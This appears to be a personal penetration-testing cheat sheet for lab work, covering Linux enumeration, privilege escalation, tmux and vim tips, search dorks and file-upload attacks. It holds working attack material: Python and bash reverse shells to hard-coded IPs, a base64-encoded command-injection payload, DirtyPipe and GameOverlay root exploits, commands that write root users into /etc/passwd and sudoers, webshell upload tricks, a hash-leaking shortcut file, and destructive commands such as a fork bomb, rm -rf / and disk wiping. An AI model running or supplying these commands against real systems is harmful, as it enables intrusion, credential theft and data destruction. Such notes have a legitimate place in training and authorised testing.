Both
- `cat /etc/fstab` [fstab](https://geek-university.com/linux/etc-fstab-file) File lists all drives that will be mounted at boot time.
- `mount` List all mounted file systems
- - `lsblk` . Use [lsblk](https://linux.die.net/man/8/lsblk) to view all available disks ( some might not be mounted).

### List device drivers and kernel modules for later exploitation.

```
:$ lsmod
:$ /sbin/modinfo <MODULE_NAME>
```



#### Has the User left anything juicy
```
cat .history                          # Linux Privesc - Anything left in the history
cat .bash_history                     # Linux Privesc - Anything left in the history
cat .bashrc                           # Linux Privesc - Anything left in the history
```

Blatant flag run `find / -type f -exec grep -H -E 'OS{|flag' {} \; 2>/dev/null`

### Linux Smart Enumeration
- https://github.com/diego-treitos/linux-smart-enumeration


## LinPeas
- `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee >(ansi2html > LinPeasReport.html)`
- `wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`



#### Get a Linpeas report from a container from local machine to container shell and back
1. Copy Linpeas to each container `for container in $(docker ps -q); do docker cp sweet.sh $container:/; done`
1. Start the `script` utility `script REPORT_FROM-terminal.txt`
1. On your local machine Run this to get a shell `oc exec -it CONTAINER-POD -- /bin/bash`
1. run linpeas on the container : `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
1. `exit` to exit the container terminal 
1. `exit` to exit the local script command terminal 
1. On your local machinie `cat REPORT_FROM-terminal.txt `
1. View it in your local webbrowser


## ss (Socket statistics)
`ss -tln`
```
-l: Display only listening sockets.
-t: Display TCP sockets.
-n: Do not try to resolve service names.
```
#### Linux Misc Tricks

- `grep MemTotal /proc/meminfo` - Get the total ram/Memory of the system
- `for i in $(compgen -a); do alias $i ; done`        # List all the aliases and the see what commands they actually do
- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` # List of all SUID and SGID Executables - from : https://atom.hackstreetboys.ph/linux-privilege-escalation-suid-sgid-executables/
- `watch -n 60 "date && free -h"` # Run two commands in watch at the same time every 60 seconds
- `cat PRTG_Configuration.dat | sed 's/^[ \t]*//' | uniq   		# right justify all lines`
- `grep -0i user <TARGET_FILE> | sed 's/ //g' | sort -u           # get all the uniq lines and get rid of all white spaces - TO make it easy to read`
- `grep -B5 -A5 -i password <TARGET_FILE> | sed 's/ //g'|sort -u| less`
- `awk '!/^$/' FILENAME > NEWFILE.out`  				# remove empty lines
- `find / -type f -group developers 2>/dev/null -ls`
- `watch -n 0.1 'ls -lt $(find <DIR_PATH> -type f -mmin -30)'` # find files modified in the last 30 mins , and refresh  10th of a minute ( I thinnk)
- `for logfile in /PATH/TO/LOG/FILES/*.LOG; do tail -f $logfile & done` # Tail all the log files 




##### Makefile privesc ( see notes below ) - offsec SPX

```
all:
        @echo "Do nothing in all"

install:
        chmod u+s /bin/bash
```

Create this make file (with tabs, not spaces), build it, and then run `/bin/bash -p` to persist with the root privlege

```sh
profiler@spx:~/php-spx$ sudo make install -C /home/profiler/php-spx
make: Entering directory '/home/profiler/php-spx'
chmod u+s /bin/bash
make: Leaving directory '/home/profiler/php-spx'
profiler@spx:~/php-spx$/bin/bash -p
bash-5.1# id
uid=1000(profiler) gid=1000(profiler) euid=0(root) groups=1000(profiler)
```



### xargs
Runs a command for every line of input
- `xargs -n1 -I{}sh -c ' echo {} base64 -d'` , where...
  - `-n1` is to do 1 at a time
  - `-I{}` is to got to the utility specified ; eg `sh`

### add a new users
```sh
sudo useradd -m -s /bin/bash USERNAME   # Create user , set home and default shell
sudo passwd USERNAME                    # Set password
sudo usermod -aG sudo username          # Optional : add to sudoers
```


Add a new root user by overriting the passwd file. Example from (Offsec linux privesc on the Nukem box)  

```
openssl passwd asd123
LFILE='/etc/passwd'
/usr/bin/dosbox -c 'mount c /' -c "echo shatternox:\$1\$ZcfsueEb\$XYBEDdtPACqWJML3/drmC1:0:0:root:/root:/bin/bash >> c:$LFILE" -c exit
```
Add someone to sudoers file (Offsec linux privesc on the Nukem box)
```
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
```


##### offsec Cassios - Sudoers 
We had sudo permission on the `sudoedit /home/*/*/recycler.ser`      # sudoers edit permission with sudo
The sudoers file contained:
```sh
samantha ALL=(root) NOPASSWD: sudoedit /home/*/*/recycler.ser        # sudoers edit permission with sudo
```
SO if we create a symbolic link to the sudoers file top the name of the file we can edit, we can edit the sudoers file. 
```
ln -s /etc/sudoers /home/samantha/asd/recycler.ser                   # sudoers edit permission with sudo
sudoedit -u root /home/samantha/backups/recycler.ser                 # sudoers edit permission with sudo
```
Add/edit the line to be                                              # sudoers edit permission with sudo
```
samantha ALL=(ALL) NOPASSWD: ALL                                     # sudoers edit permission with sudo
``` 



## Linux Privesc
```
ls -la                                                 # Linux Privesc -  HAve a look ain the home dir 
ls -la /usr/local/                                     # Linux Privesc -  Things in the /usr/local are normally placed explicitly by the admin so could be interesting and non standard. The package manager would not have put it there.
echo $PATH
(env || set) 2>/dev/null                               # Linux Privesc -   Whats in the env

ip -a                                                  # Linux Privesc -  eth0 see if funny NAT stuff going on 
sudo -l                                                # Linux Privesc -  This will list all the commands the user can run as root. May require user Auth
ps -ef --forest  
ps axjf  
ss -lntp                                               # Linux Privesc -  see if anything is listening 

cat /etc/os-release 2>/dev/null

find / -type f -perm -4000 -ls 2>/dev/null             # Linux Privesc -  find SUIDs
Linpeas - the phrase "Unknown SUID binary!"            # Linux Privesc -  find Unknown SUIDs
find / -type d -writable -exec echo {} \; 2>/dev/null  # Linux Privesc -  find places where I can write to files
find / -type d -perm -u=w -print 2>/dev/null           # Linux Privesc -  find places where "others" o can write to files
find / -type d -perm -g=w -print 2>/dev/null           # Linux Privesc -  find places where groups can write to files



systemctl list-units --type=service                    # Linux Privesc -  will all the services which are running
find /etc/ -name *.service`                            # Linux Privesc -  will also list the services

lsb_release -a                                         # Linux Privesc -  get the linux Kernel version running 

# We can then cat the service files to see how `systemd` starts it - # Linux Privesc -
cat /etc/systemd/system/SOME-SERVICE.service           # Linux Privesc -

cat /usr/local/etc/doas.conf                           # Linux Privesc -    Doas is an alt to sudo from bsd and the cnf file might list provledged commands which can be run
find /intreting/directory/ -writable                   # Linux Privesc -                               
grep -R system .                                       # Linux Privesc -
grep -R popen .                                        # Linux Privesc -
                                                       # Linux Privesc -  Look at the web server maybe in `/opt` or `/var/www`
cat /etc/cron.d/*                                      # Linux Privesc -  - Look at all the cron jobs

# Linux Privesc -  Reference Kernel exploits via my local machine and then comapre 
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '

# Linux Privesc -  Check exploit suggestor
https://github.com/The-Z-Labs/linux-exploit-suggester

sudo -V                                                # Linux Privesc -  check for vuln versions of Sudo
sudo -s                                                # Linux Privesc -  change to sudo but -s keeps the shell as it is 

```

If we have arbitrary File read , ssh keys are a good target , the file names can vary depending on the [key type](https://linux.die.net/man/1/ssh-keygen) .eg `id_ecdsa`


```
K:> ssh-keygen -lf sarahkey      # SSH Key Formatting: ssh validate if a key file is formated correctly

K:> cat -A keyData_fixed                                                                                                # SSH Key Formatting: Verify the original key structure and remove unnecessary characters
K:> grep -v "^-.*-$" keyData_fixed | tr -d '\n' > keyData_single_line                                                   # SSH Key Formatting: Remove '$' symbols and join all lines into a single line
K:> fold -w 64 keyData_single_line > keyData_proper                                                                     # SSH Key Formatting: Re-slice the single-line key into proper 64-character lines
K:> vi keyData_proper                                                                                                   # SSH Key Formatting: Add header and footer to ensure it matches OpenSSH private key format          
# -----BEGIN OPENSSH PRIVATE KEY-----                                                                                   # SSH Key Formatting:   Ensure it starts with:                    
# -----END OPENSSH PRIVATE KEY-----                                                                                     # SSH Key Formatting:   .... And ends with:                                            
NOTE: Some people say to make sure that there is a hard return at the end of dashes after the lasts words PRIVATE KEY   # SSH Key Formatting: Notes
NOTE: PRivate keys don't like Tmux as much so sometimes login from a standalone terminal                                # SSH Key Formatting: Notes
K:> ssh-keygen -lf keyData_proper                                                                                       # SSH Key Formatting: Check the validity of the key
K:> chmod 600 keyData_proper                                                                                            # SSH Key Formatting: Secure the key file by setting appropriate permissions
K:> ssh-keygen -lf keyData_proper                                                                                       # SSH Key Formatting: Verify again to confirm the key is properly formatted
K:> proxychains ssh -i keyData_proper sarah@172.16.139.19                                                               # Successful login # Test Connection: Attempt to log in to the target server as the intended user

proxychains scp -i sarahkey LP.sh sarah@172.16.139.19:/home/sarah/     # use scp to copy over a file with a public key


```

### Linux Kernel Exploits - CVE-2022-0847 DirtyPipe

```
- local save in immidate tools called :  "DirtyPipe_exp_CVE-2022-0847" ( copy of the binary of https://github.com/Al1ex/CVE-2022-0847 [CVE-2022-0847] DirtyPipe ) 

cp /etc/passwd /tmp/passwd.bak                             # 1 - make a backup of /etc/passwd                   - Kernel exploit of [CVE-2022-0847] DirtyPipe
./DirtyPipe_exp_CVE-2022-0847 /etc/passwd 1 ootz:          # 2 - Run the exploit binary adding ootz             - Kernel exploit of [CVE-2022-0847] DirtyPipe
su rootz                                                   # 3 - switch to the new root user                    - Kernel exploit of [CVE-2022-0847] DirtyPipe
id                                                         # 4 - double check you id level and read the shadow  - Kernel exploit of [CVE-2022-0847] DirtyPipe

cp /etc/passwd /tmp/passwd.bak                                                                   # ALt steps of - Kernel exploit of [CVE-2022-0847] DirtyPipe
gcc exp.c -o exp                                                                                 # ALt steps of - Kernel exploit of [CVE-2022-0847] DirtyPipe
./exp /etc/passwd 1 ootz:                                                                        # ALt steps of - Kernel exploit of [CVE-2022-0847] DirtyPipe
su rootz                                                                                         # ALt steps of - Kernel exploit of [CVE-2022-0847] DirtyPipe
id                                                                                               # ALt steps of - Kernel exploit of [CVE-2022-0847] DirtyPipe
```



### Linpeas (approach for priv esc)
- Look for RedYellow first
- Kernel exploits are the lasts thing to check becasue they are not too relaible
- capabilities ` cap_net_raw` full access over network sockets


### Privesc via Python library
```
offsec@debian:~$ sudo -l
Matching Defaults entries for offsec on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User offsec may run the following commands on localhost:
    (root) NOPASSWD: /bin/pkexec
    (root) /usr/bin/python3 -m smtpd -n -c DebuggingServer 0.0.0.0\:25

```

##### Using Strace to follow the command flow and find an entry point 
!! `/usr/bin/python3 -m smtpd -n -c DebuggingServer 0.0.0.0\:25`
Allows us to trace system calls signals for specified commands. 
On out local machine we can run a test to see where python is loading `smtpd` from and subvert the `__init__.py` file.   `/usr/bin/python3 -m smtpd -n -c DebuggingServer 0.0.0.0\:25`
```
strace -e trace=file -o traceReport.txt /usr/bin/python3 -m smtpd -n -c DebuggingServer 0.0.0.0\:25
```

#### GameOverlay Linux Kernel Privesc
**Isolated Environment**: The script creates a safe, isolated environment using namespaces.
**Directory Preparation**: It prepares necessary directories for the overlay filesystem.
**Copy and Enhance Binary**: Copies the python3 binary and gives it special capabilities to change user IDs.
**Overlay Filesystem**: Sets up an overlay filesystem to manage changes without altering the original system.
**Privilege Escalation**: Uses the enhanced python3 binary to change its user ID to root and runs a command to get root access.

This payload is designed to manipulate the filesystem and capabilities to elevate privileges on a Linux machine, effectively gaining root access.
```sh
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("sudo su -")'
```

Step-by-Step Breakdown:
1. `unshare -rm sh -c "..."` - Create a New Isolated Environment:
   1. `unshare -rm` starts a new shell in a new mount and UTS namespace. This means the commands inside will run in an isolated environment, separate from the main system.
2. `mkdir l u w m` - Create Directories:
   1. Inside the new environment, this command creates four directories:
    `l`: Lower directory (where original files will be copied).
    `u`: Upper directory (where changes will be made).
    `w`: Work directory (needed for the overlay filesystem operations).
    `m`: Mount point (where the combined view of the filesystem will be presented).
3. `cp /u*/b*/p*3 l/` - Copy the Python Binary:
   1. This command copies the python3 binary from the system to the l (lower) directory. It uses wildcards to locate the binary, typically found in /usr/bin/python3.

4. `setcap cap_setuid+eip l/python3` - Set Special Capabilities:
   1. This command gives the copied python3 binary the cap_setuid capability, allowing it to change its user ID. This is crucial for escalating privileges.

5. `mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m` - Mount the Overlay Filesystem:
   1. This sets up an overlay filesystem with:
    `lowerdir=l`: The lower directory containing the original python3 binary.
    `upperdir=u`: The upper directory where any changes or new files will go.
    `workdir=w`: A working directory needed by the overlay filesystem.
    `m`: The mount point where the combined view will be seen.

6. `touch m/*` - Ensure Changes are Activated:
   1. This command touches all files in the combined view at m. This is a way to ensure the overlay filesystem is active and ready.

7. `u/python3 -c 'import os;os.setuid(0);os.system("sudo su -")'` - Run the Python Script to Escalate Privileges:
    `u/python3`: Runs the python3 binary from the upper directory (u).
    `import os`: Imports the os module in Python.
    `os.setuid(0)`: Sets the user ID to 0, which is the root user.
    `os.system("sudo su -")`: Runs a command to switch to the root user.




# BASH

```
/bin/bash -p    # starts a shell but not as the user but as the group. IT doenst revert the user 
kill -9 <PID>   # Kill a process with SIGTERM (-9) and the PID


```
## Bash 1-Liners
```
exec python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4567));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'   # Python 1 linere Reve shell for a script  # python reverse shell

sudo apt install --only-upgrade code     # Update vscode

```

### coured shell OP export 
`ansi2html` - https://pypi.org/project/ansi2html/
but then it said ??- `sudo apt install colorized-logs` ??

# Tmux

TMux confi  file , create in hiome dir `.tmux.conf` 
```
set -g history-limit 10000                      # Set history buffer to 10,000 lines
set -g mouse on                                 # Nicer mouse scroll apparently
bind c new-window -c "#{pane_current_path}"     # Makes new terminals open in the pwd
```

```sh
C-b : Hey Tmux  ( Prefix key)

c-b c : create a new window in your session                                             # Tmux skills 
c-b d : Detach from your tmux session                                                   # Tmux skills 
tmux a : attache to the most recent session                                             # Tmux skills 
tmux new -s Session1 : Start a new tmux session called Session1                         # Tmux skills 
tmux ls : list all tmux sessions                                                        # Tmux skills 
tmux a -t <SESSION_NAME_OR_INDEX> : attach to a specific target tmux session            # Tmux skills 
tmux kill-session : Kill hte most recent tmux session                                   # Tmux skills 
tmux kill-session -t <SESSION_NAME_OR_INDEX> : Kill a taarget tmux session              # Tmux skills 


# Spliting Panes (Tmux)                                                                 # Tmux skils
c-b %  : Split pane virtically                                                          # Tmux skils
c-b " : split pane horizontaly                                                          # Tmux skils
c-b <DIRECTION-ARRAOW> : moves to a different pane                                      # Tmux skils
c-b q : displays pane index                                                             # Tmux skils
c-b q 2 : jump to pane 2                                                                # Tmux skils
c-b q 0 : jump to pane 0                                                                # Tmux skils
c-b hold-CTL <ARROWS> : resize panes                                                    # Tmux skils
c-b c : create a new window in your session                                             # Tmux skils

c-b n : move to the next window                                                         # Tmux skils
c-b p : move to the previous window                                                     # Tmux skils

c-b , : rename present window                                                           # Tmux skils
c-b w : list of windows and sessions                                                    # Tmux skils
c-b w c-b x : kill highlighted session                                                  # Tmux skils
c-b x : kill hgihlighted pane                                                           # Tmux skils

c-b [ : Enter to copy mode to scroll up and down with mouse or arrow                    # Tmux skils


K:> tmux list-sessions                                                          # Tmux - if you accidentlyt deleted your terminal , your session will still be availible
K:> tmux attach                                                                 # Tmux - if you accidentlyt deleted your terminal , your session will still be availible
K:> tmux attach-session -t 0                                                    # Tmux - if you accidentlyt deleted your terminal , your session will still be availible

---Config setting 
set -g mouse on          -- ???
setw -g node-keys vi     -- ???

tool: subfinder

```

## ZSH Terminal Shortkeys

```
Ctl+Shft+T # New Tab
Ctl+Shft+W # Del Tab
Alt-Sft+S # rename Tab
Ctl+PgeDwn # Next ta
Ctl+PgeUp # Next tab
```


#### Linux 

Search for a particualr tool `<sudo apt-cache search <TERM>` 


# Vim

### Vim macro to convert a list of names to possible usernames quickly
lets say you have a list of names
```sh
Fergus Smith 
Shaun Coins
Sophie Driver 
Bowie Taylor
Hugo Bear
Steven Kerb
```
1. start by pressing `q,a` which hmeans record the macro and it will start on `a`
2. Macro: `yy` t oyank the line
3. `3p` to paste the line 3 times 
4. hit home to get the cursor at the beginning
5. `/, ` <- SPACE , `.` , `esc` - This will swap the empty space for a `.`
6. home, right one,  `dw` for delete word 
7. home, right one,  `dw` for delete word, `i` for insert mode and put a `.` 
8. Down key, home , `esc` to exit insert mode
9. `q` to exit recording mode
10. pressing `@,a` on the next line will replay all the previous keys in steps 2-9
11. with 4 more lines to process we can just type `4@a` to do the rest of the

----
### Vim  copy paste
✅ Yank (Copy)
yy — yank (copy) current line
2yy — yank 2 lines
y$ — yank to end of line
y} — yank to end of paragraph
v → move → y — visually select and yank
✅ Paste
p — paste after cursor
P — paste before cursor
✅ Cut (Delete + Yank)
dd — delete (cut) current line
d} — delete to end of paragraph
v → move → d — visually select and cut
✅ Use registers (optional)
"ay — yank into register a
"ap — paste from register a


### Vim cmds from the buffer - and back into Vim!!
- `:%!sort -u` - sort things 
- `:%!grep -V <TERM>` - get rid of anything with `TERM`

- `Ctl + v` goes int ovisual block mode and you can highlight multiple bits of text
- `.` will repeat the last command

----




#### Secureing Curl payloads with encodeing

1. Create a b64 payload for the username id param:
- `echo -n 'bash -i  >& /dev/tcp/10.10.14.100/9001 0>&'|base64 -w0`
1. curl the endpoint with the payload and a decode
```
curl http://10.129.229.26:55555/at4fwy1/ --data 'username=;`echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAwLzkwMDEgMD4mMQ== | base64 -d | bash`'
```
This method protects the payload from any special chars getting extracted


```
bash -i >& /dev/tcp/10.10.16.2/9001 0>&1`

echo 'import socket,os,pty;' >> script3.py 
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> script3.py 
echo 's.connect(("10.10.16.2",4242));' >> script3.py 
echo 'os.dup2(s.fileno(),0);' >> script3.py 
echo 'os.dup2(s.fileno(),1);' >> script3.py 
echo 'os.dup2(s.fileno(),2);' >> script3.py 
echo 'pty.spawn("/bin/sh")' >> script3.py 
```

## Compgen -c 
List all the permissions of each compgen binary and then use this to compare to GTFObins
`compgen -c | sort -u | while read cmd; do which $cmd &>/dev/null && ls -la $(which $cmd); done`
### Linux Version

The following commands can all find os name and version in Linux:
```
cat /etc/os-release
lsb_release -a
hostnamectl
```
# Find Linux kernel version
```
uname -r 
```
`usermod -aG sudo <USERNAME>  # add <USERNAME> to the sudoers group` 
 
## LXD
LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to
match the permissions of the calling user to the function it is asked to perform.

To Read - https://www.hackingarticles.in/lxd-privilege-escalation/
`Linux Container (LXC)` are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.
`Linux daemon (LXD)` is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

```
apt install lxd
apt install zfsutils-linux
usermod --append --groups lxd Bob
lxd init
lxc launch ubuntu:18.04
lxc list
```


----

## Linux conviniences

```
in /etc/ssh/sshd_config   - in PasswordAuthentication   set it to : yes . us vi or sed  # ssh set password authentication login for lateral movment and simplisity
sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config  # ssh set password authentication login for lateral movment and simplisity


```



#### Linux System killers (Dinial OF service DOS) 

```
:(){ :|:& };:                     # Linux killers DOS - Logic Bomb - Fix= Limit the number of process spawned in /etc/security/limits.conf

func() {                          # Linux killers DOS - Logic Bomb as a func
  func | func &                   # Linux killers DOS - Logic Bomb as a func                                      
};                                # Linux killers DOS - Logic Bomb as a func      
func                              # Linux killers DOS - Logic Bomb as a func        

rm -rf /                          # Linux killers DOS - Delete the file system : Fix= alias rm='rm -i --preserve-root'

dd if=/dev/zero of=/dev/sda       # Linux killers DOS - Overwrites the disk with zeros : Fix= alias dd='echo "dd command is not available"'

kill -9 -1                        # Linux killers DOS - Kill everthing for the current user

chmod -R 777 /                    # Linux killers DOS - Make everthing oen to all : Fix= alias chmod='chmod --preserve-root'
```




## ---------------------------------- LINUX ----------------------------------
```
&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&
&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX
&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&END-OF-LINUX&
```
## ---------------------------------- LINUX ----------------------------------




## ---------------------------------- GENERAL+TOOLS+TECH ----------------------------------
```
&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&
&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH
&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&GENERAL+TOOLS+TECH&
```
## ---------------------------------- GENERAL+TOOLS+TECH ----------------------------------


## VM conf
To open shared dir from host to VMware Worksatation
```
sudo vi /etc/fstab                # open this file and add the line below
.host:/ /mnt/hgfs/ fuse.vmhgfs-fuse defaults,allow_other,uid=1000 0 0
```

## Testing MTU for network issues 
```sh
ping -M do -s 1472 192.168.179.191          # Packet MTU testing network issues - ping and don't fragment sending a packet of 1472 bytes to find the sweet spot
sudo ifconfig tun0 mtu <SWEET_BYTES>        # Packet MTU testing network issues - Set MTU ( Temporarily)
sudo ifconfig tun0 mtu 1250                 # Packet MTU testing network issues - Offsec current 12/24  guidance ( https://help.offsec.com/hc/en-us/articles/360046293832--Common-VPN-and-Machine-VM-Issues ) 
ip link show dev tun0                       # Packet MTU testing network issues - See the current configured MTU value 
```

```sh
cat /etc/network/interfaces                 # Packet MTU testing network issues - See the current configuration file for MTU persistence
```

Might look like ...
```sh
auto lo
iface lo inet loopback

auto tun0
iface tun0 inet dhcp
```

Need to add a section like...

```sh
iface tun0 inet dhcp 
  mtu 1200
```

```sh
sudo systemctl restart networking          # Packet MTU testing network issues - Restart once new config has been written
```

----
 
### Google Dorks (Search)

The [_Google Hacking Database_](https://www.exploit-db.com/google-hacking-database)(GHDB).
The process is iterative, beginning with a broad search, which is narrowed using operators to sift out irrelevant or uninteresting results.
- `site:` Limits the search to a specific domain
- `filetype:` Limits to specific file types ( also can use `ext:`)
- `site:megacorpone.com -ext:html` only the site and not html pages
- `intitle:"indexof" "parent directory"` look for a specific title and content of the page.
  
```
ext == filetype 
ext:php,ext:xml,ext:py
site:megacorpone.com ext:txt 
intext:"@megacorpone.com" -site:www.megacorpone.com 
site:tesla.com -www -shop -share -ir -mfa   # exclude boring domains 

# look for code left over rom Devs
site:pastebin.com
site:jsfiddle.net
site:codebeautify.org
site:codepen.io "tesla.com"

site:tesla.com ext:php inurl:?		   	 					# look for php and parameters (?) in urls

site:openbugbounty.org inurl:reports intext:"yahoo.com"    # look for disclosed adn undisclosed Bug Biounties

(site:tesla.com | site:teslamotors.com) & ”choose file”    # Combine Dorks

# find buckets and sensitive data
site:s3.amazonaws.com "example.com"
site:blob.core.windows.net "example.com"
site:googleapis.com "example.com"
site:drive.google.com "example.com"
# Add terms like confidential, privileged, not for public release to narrow your results
```



| Search operator |                         What it does                        |         Example         |
|:---------------:|:-----------------------------------------------------------:|:-----------------------:|
| `“ ”`             | Search for results that mention a word or phrase.           | “steve jobs”            |
| `OR`              | Search for results related to X or Y.                       | jobs OR gates           |
| `|`              | Same as OR:                                                 | `jobs | gates`           |
| `AND`             | Search for results related to X and Y.                      | jobs AND gates          |
| `-`               | Search for results that don’t mention a word or phrase.     | jobs -apple             |
| `*`               | Wildcard matching any word or phrase.                       | steve * apple           |
| `( )`             | Group multiple searches.                                    | (ipad OR iphone) apple  |
| `define:`         | Search for the definition of a word or phrase.              | define:entrepreneur     |
| `cache:`          | Find the most recent cache of a webpage.                    | cache:apple.com         |
| `filetype:`       | Search for particular types of files (e.g., PDF).           | apple filetype:pdf      |
| `ext:`            | Same as filetype:                                           | apple ext:pdf           |
| `site:`           | Search for results from a particular website.               | site:apple.com          |
| `related:`        | Search for sites related to a given domain.                 | related:apple.com       |
| `intitle:`        | Search for pages with a particular word in the title tag.   | intitle:apple           |
| `allintitle:`     | Search for pages with multiple words in the title tag.      | allintitle:apple iphone |
| `inurl:`          | Search for pages with a particular word in the URL.         | inurl:apple             |
| `allinurl:`       | Search for pages with multiple words in the URL.            | allinurl:apple iphone   |
| `intext:`         | Search for pages with a particular word in their content.   | intext:apple iphone     |
| `allintext:`      | Search for pages with multiple words in their content.      | allintext:apple iphone  |
| `weather:`        | Search for the weather in a location.                       | weather:san francisco   |
| `stocks:`         | Search for stock information for a ticker.                  | stocks:aapl             |
| `map:`            | Force Google to show map results.                           | map:silicon valley      |
| `movie:`          | Search for information about a movie.                       | movie:steve jobs        |
| `in`              | Convert one unit to another.                                | $329 in GBP             |
| `source:`         | Search for results from a particular source in Google News. | apple source:the_verge  |
| `before:`         | Search for results from before a particular date.           | apple before:2007-06-29 |
| `after:`          | Search for results from after a particular date.            | apple after:2007-06-29  |



**search for any files with the word "users" in the filename**
`path:users`

**Find exposed environment files:**
`filename:.env`

**Find SQL files that might contain passwords:**
`extension:sql password`

**Find configuration files within a config directory:**
`path:config database`

**Search within a specific organization:**
`org:exampleorg`

**Search within a specific repository:**
`repo:username/reponame`

**Search for repositories of a specific user:**
`user:username`

**Search for files containing both 'password' and 'database':**
`password database`

**Search for a specific variable name:**
`"DB_PASSWORD"`

**Find large files:**
`size:>10000`

**Find popular repositories:**
`stars:>100`

WordPress: `inurl:/wp-admin/admin-ajax.php`
Drupal: `intext:"Powered by" & intext:Drupal & inurl:user`
Joomla: `site:*/joomla/login`



### Joomla scanning

Joomscan is an owasp tool but its not amazing but has activity - https://github.com/OWASP/joomscan

```
# Find Common Xss vuln Params
inurl:q= | inurl:s= | inurl:search= | inurl:query= inurl:& site:example.com

# OPEN REDIRECTS
inurl:url= | inurl:return= | inurl:next= | inurl:redir= inurl:http site:example.com
```

# File upload 

Can we upload a new `.htaccess` file? permitting exstensions like `.evil` ??

IF we can  not get a stright shell can we modify the `.htaccess` file, upload that and then get a shell that way as per offsec Access ? 
```
K:> echo "AddType application/x-httpd-php .evil" > .htaccess
K:> mv rev-shell.php webshell.evil
```

We could then create a `webshell.evil` fro mthis webshell ( https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php) and upload it.


## Malicious Gif
handy example - https://github.com/delosec/Exploits-and-code-snippets/blob/master/malicious.gif.php
alt Tool "gifsicle" - https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-pwh2-fpfr-x5gf

```
GIF89a;                         # Malicious gif to php RCE - gif siganture to start the file  0 eg (Offsec Escape)
cat.gif.php                     # Malicious gif to php RCE - double name
Content-Type: image/gif         # Malicious gif to php RCE - edit the content type
```

## File signatures 

```

# File upload signatures - Image Formats
GIF87a;            # File upload signatures - GIF image (old format)
GIF89a;            # File upload signatures - GIF image (common)
\x89PNG\r\n\x1a\n  # File upload signatures - PNG image
\xff\xd8\xff       # File upload signatures - JPEG/JPG image
BM                # File upload signatures - BMP image
II*\x00           # File upload signatures - TIFF image (Intel byte order)
MM\x00*           # File upload signatures - TIFF image (Motorola byte order)

# File upload signatures - Document Formats
%PDF-             # File upload signatures - PDF document
\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1  # File upload signatures - Microsoft Office (pre-2007 DOC/XLS/PPT)
PK\x03\x04        # File upload signatures - DOCX/XLSX/PPTX (Office Open XML, also ZIP based)
{\\rtf            # File upload signatures - RTF document

# File upload signatures - Archive Formats
PK\x03\x04        # File upload signatures - ZIP archive
\x52\x61\x72\x21\x1a\x07\x00  # File upload signatures - RAR archive
7z\xbc\xaf\x27\x1c            # File upload signatures - 7z archive
\x1f\x8b                      # File upload signatures - GZIP archive
ustar                       # File upload signatures - TAR archive (embedded within header)

# File upload signatures - Executable Formats
MZ               # File upload signatures - Windows EXE or DLL
\x7fELF          # File upload signatures - Linux ELF executable
\xcf\xfa\xed\xfe # File upload signatures - macOS Mach-O (little endian)
\xfe\xed\xfa\xcf # File upload signatures - macOS Mach-O (big endian)

# File upload signatures - Script/Text Files
<?php            # File upload signatures - PHP script (starts with PHP tag) 
<!DOCTYPE html>  # File upload signatures - HTML document
<html>           # File upload signatures - HTML file (alternative start)
function         # File upload signatures - JavaScript (typical JS start)
var              # File upload signatures - JavaScript (alternative start)
#!/bin/bash      # File upload signatures - Shell script (with shebang)
#!               # File upload signatures - Any Unix-like script (generic shebang)
```

### Malicious files type examples

```url
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon
IconIndex=1
```


----

# Hacking tools


### msfvenom - Generating Custom Reverse Shell Scripts

```bash
